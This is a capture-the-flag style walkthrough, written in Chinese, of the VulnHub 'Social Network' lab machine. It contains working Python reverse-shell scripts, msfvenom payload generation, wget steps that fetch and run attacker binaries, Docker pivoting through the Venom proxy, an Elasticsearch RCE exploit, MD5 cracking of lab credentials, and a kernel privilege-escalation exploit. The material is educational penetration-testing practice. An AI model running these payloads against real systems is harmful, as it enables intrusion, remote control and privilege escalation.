靶机地址：[BoredHackerBlog: Social Network ~ VulnHub](https://www.vulnhub.com/entry/boredhackerblog-social-network,454/)
扫描当前网段所有主机
```Shell
arp-scan -l
```
扫描所有端口
```Shell
nmap -p- "192.168.1.25"
```
枚举服务版本
```Shell
nmap -p22,5000 -sV 192.168.1.25
# 发现一个http服务
# 5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)
```
打开web网页 简单测试 并没有发现什么漏洞
接下来进行常规操作：枚举路径
```Shell
dirsearch -u http://192.168.1.25:5000
# 扫出一个/admin 发现可以执行python代码
```
Python反弹shell负载示例
利用metasploit
```Shell
# 列出所有payload
msfvenom -l payloads > msf_payloads.txt
# 检索python 暂时用不上meterpreter
cat msf_payloads.txt | grep python | grep -v meterpreter
# 发现两个可能比较符合要求的payload
# cmd/unix/python/shell_reverse_tcp                                  Execute a Python payload from a command. Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.
# python/shell_reverse_tcp                                           Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.
# 尝试生成负载
msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.26 LPORT=4444 > shell_reverse_tcp.py
# 查看负载
cat shell_reverse_tcp.py
# 直接粘贴到网页中执行即可
```
两个Python反弹Shell脚本示例
```Python
# metasploit 生成的脚本解码后的
import socket as s
import subprocess as r
so=s.socket(s.AF_INET,s.SOCK_STREAM)
so.connect(('192.168.1.26',4444))
while True:
        d=so.recv(1024)
        if len(d)==0:
                break
        p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
        o=p.stdout.read()+p.stderr.read()
        so.send(o)
```
```Python
# 这个会显示更多内容 稍微好用一点儿
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.1.26", 4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
可以成功获取反弹shell
```Shell
whoami # root用户
ls # 发现存在Dockerfile
```
仅仅是拿到了Docker容器的Shell
```Shell
ls /.dockerenv
cat /proc/1/cgroup
ip address
```
发现是一个内网IP：`inet 172.17.0.3/16`
通过单行Shell脚本探测内网中存活的IP（也可以先传些工具上去再探测）
```Shell
# 真实环境下应当扫65536个IP 这里只尝试10个
for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done
```
发现三个IP存活，除本机 `172.17.0.3` 外，还有 `172.17.0.1` 和 `172.17.0.2` 。
接下来要对这两个IP进行端口扫描，直接使用 `kali` 中的工具很不方便。
这样的话需要用到 `Venom` 作为代理工具，首先要将 `Venom` 的agent端二进制文件传输到跳板机上。先检查跳板机上的工具。
```Shell
which scp # not found
which curl # not found
which wget # found
which nc # found
```
发现只有 `wget` ，可以在本地启动一个http服务，再在跳板机上通过 `wget` 把文件下载下来。使用nc传输也可以。
```Shell
# 快速建立HTTP服务 如果使用低端口可能要加sudo
# 托管当前路径中的任何文件和文件夹
python -m SimpleHTTPServer 7331  # Python 2.x
python3 -m http.server 7331      # Python 3.x
php -S 0.0.0.0:8000              # PHP # 不知道是托管哪个目录 不太好用
ruby -run -e httpd . -p 9000     # Ruby
busybox httpd -f -p 10000        # busybox # 被称为嵌入式linux的瑞士军刀 # 也不太好用
```
下载对应系统版本的agent二进制文件
```Shell
wget http://192.168.1.26:7331/agent_linux_x64
# 赋予可执行权限
chmod +x agent_linux_x64
```
本机启动 `Venom` 的admin端
```Shell
./admin_linux_x64 -lport 9999
```
跳板机启动agent端连接
```Shell
./agent_linux_x64 -rhost 192.168.1.26 -rport 9999
```
连接成功后 Successfully connects to a new node 启动代理
```
(admin node) >>> goto 1
(node 1) >>> socks 7777
```
使用代理，先配置proxychains，`sudo vim /etc/proxychains4.conf`
```
# socks4        127.0.0.1 9050
socks5  127.0.0.1 7777
```
使用代理扫描
```Shell
# -Pn 或 -P0 禁ping
proxychains nmap -P0 -sT 172.17.0.1
proxychains nmap -P0 -p22,5000 -sV 172.17.0.1
# 22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
# 5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)
proxychains nmap -P0 -sT 172.17.0.2
proxychains nmap -P0 -p9200 -sV 172.17.0.2
# 9200/tcp open  http    Elasticsearch REST API 1.4.2 (name: Valentina Allegra de La Fontaine; cluster: elasticsearch; Lucene 4.10.2)
```
发现 `172.17.0.2` 中开启了一个Elasticsearch服务，搜索相关漏洞
```Shell
searchsploit Elasticsearch
# 发现两个远程代码执行利用脚本 拷贝一个试试
cp /usr/share/exploitdb/exploits/linux/remote/36337.py .
```
执行利用脚本
```Shell
proxychains ./36337.py 172.17.0.2
```
成功连接
```Shell
id # 查看当前用户 发现还是root
ls -la # 查看文件
# 发现.dockerenv 还是Docker容器
```
还有一个passwords文件，内容如下，
```
Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase
Example: 1234abcd
john:3f8184a7343664553fcb5337a3138814
test:861f194e9d6118f3d942a72be3e51749 
admin:670c3bbc209a18dde5446e5e6c1f1d5b
root:b3d34352fc26117979deabdf1b9b6354
jane:5c158b60ed97c723b673529b8a3cf72b
```
使用在线网站对其进行MD5解密
```
john:3f8184a7343664553fcb5337a3138814 # 1337hack
test:861f194e9d6118f3d942a72be3e51749 # 1234test
admin:670c3bbc209a18dde5446e5e6c1f1d5b # 1111pass
root:b3d34352fc26117979deabdf1b9b6354 # 1234pass
jane:5c158b60ed97c723b673529b8a3cf72b # 1234jane
```
尝试使用这些账号密码SSH登录目标系统
```Shell
ssh john@192.168.1.25 # 成功
# Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)
# 其它的都失败了
# Permission denied, please try again.
```
尝试获取root权限
```Shell
sudo su # 失败了
# john is not in the sudoers file.  This incident will be reported.
sudo -l # 失败了
# Sorry, user john may not run sudo on socnet.
```
最常见的提权方式是通过内核漏洞
```Shell
# 查看内核版本
uname -a
# Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
搜索漏洞
```Shell
searchsploit Linux 3.13
# 尝试一个看起来可靠的
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
```
打开漏洞利用源码后发现，需要用到gcc，只能在本机编译好后传输到目标机器上执行。
查看代码，进一步发现，还需要一个共享库，也用到了gcc，需要手动修改代码，去除这部分编译库文件的操作，改为手动将库文件传输到目标机器上。
```C
// 37292.c 注释掉这部分代码
/*
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
*/
```
编译成二进制文件 `ofs` 
```Shell
gcc -o ofs 37292.c
```
定位共享库
```Shell
locate ofs-lib.so
# /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so

# 复制到当前目录
cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .
```
启动http服务
```Shell
python3 -m http.server 7331
```
靶机上下载二进制文件和共享库
```Shell
wget http://192.168.1.26:7331/ofs
wget http://192.168.1.26:7331/ofs-lib.so
```
将这两个文件移动到 `/tmp` 目录下运行
```Shell
mv ./ofs* /tmp/
cd /tmp/
chmod +x ofs
./ofs
```
提权成功